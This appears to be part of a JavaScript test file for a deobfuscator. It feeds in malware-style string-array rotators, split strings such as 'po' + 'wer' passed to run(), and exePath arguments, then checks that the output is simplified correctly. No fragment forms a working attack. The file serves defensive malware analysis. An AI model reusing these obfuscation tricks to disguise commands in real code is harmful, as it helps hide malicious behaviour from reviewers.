  const machinery = "function arr() { var a = ['b', 'a']; arr = function () { return a; }; return arr(); }" +
    ' function dec(i) { var a = arr(); dec = function (j) { return a[j]; }; return dec(i); }' +
    " (function (f) { var a = f(); while (a[0] !== 'a') { a.push(a.shift()); } }(arr));";
  assert.equal(deob(machinery + ' log(dec(0) + dec(1));'), norm("log('ab');"));
  // a rotator that also does something else keeps the whole context
  const busy = machinery.replace('a.push(a.shift()); }', 'a.push(a.shift()); } WScript.Echo(1);');
  assert.match(deob(busy + ' log(dec(0) + dec(1));'), /WScript\.Echo\(1\)/);
});

test('constants assigned once by a plain statement; pure temps past plain copies', () => {
  const st = (c) => deobfuscate(c).code;
  assert.equal(st('try { if (c) { a = "po"; b = "wer"; run(a + b + x); } } catch (e) {} var a, b;'), norm("try { if (c) { run('power' + x); } } catch (e) { }"));
  assert.equal(st('if (c) { a = "x"; } log(a); var a;'), norm("if (c) { a = 'x'; } log(a); var a;"));          // may not have run
  assert.equal(st('log(a); a = "x"; var a;'), norm("log(a); var a = 'x';"));                                     // read first
  assert.match(st('for (var i = 0; i < 2; i++) { log(t); t = "k"; } var t;'), /log\(t\)/);                     // next iteration
  assert.match(st('a = "x"; this[k] = 1; log(a); var a;'), /log\(a\)/);                                         // this[k] may write it
  assert.match(st('var a = "x"; this[k] = 1; log(a);'), /log\(a\)/);
  // v5 = exePath; v6 = path2; f(v5 + v6) -> f(exePath + path2)
  assert.equal(st('function f(e, p) { var c = g(); v5 = e; v6 = p; v7 = c; c2 = "x" + v5 + v6 + v7; run(c2, 0); var v5, v6, v7, c2; } use(f);'),
    norm("function f(e, p) { var c = g(); run('x' + e + p + c, 0); } use(f);"));
  // never past a copy that writes what the value reads, and never with a call
  assert.match(st('function f(e) { t = e; e = 2; run(t); var t; } use(f);'), /t = e/);
  assert.match(st('function f(e) { t = e(); u = g(); run(u, t); var t, u; } use(f);'), /var t = e\(\);\s*run\(g\(\), t\)/); // e() must still run before g()
  assert.match(st('function f(p) { t = arguments[0]; p = 5; run(t); var t; } use(f);'), /t = arguments\[0\]/);
});
